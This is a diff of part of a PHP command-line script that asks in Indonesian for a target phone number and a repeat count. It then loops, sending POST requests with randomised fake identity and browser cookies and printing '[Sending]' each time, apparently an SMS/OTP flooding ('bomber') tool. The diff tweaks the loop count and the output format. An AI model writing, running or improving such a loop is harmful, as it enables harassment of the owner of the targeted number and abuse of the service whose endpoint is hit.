@@ -32,7 +32,7 @@ echo "Nomor Target?\nInput : ";
 $nomer = trim(fgets(STDIN));
 echo "Jumlah?\nInput : ";
 $jumlah = trim(fgets(STDIN));
-for($a=0;$a<$jumlah;$a++) {
+for($a=0;$a<$jumlah-1;$a++) {
 	$rand1 = md5(rand(12345678,98765432));
 	$rand2 = md5(rand(12345678,98765432));
 	$rand = array($rand1,$rand2);
@@ -71,7 +71,7 @@ Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
 	$asw = curl_exec($ch);
 	curl_close($ch);
-	print $a+1;
+	print $a+1." |";
 	print $nomer;
 	print $G." [Sending]\n".$X;
 }
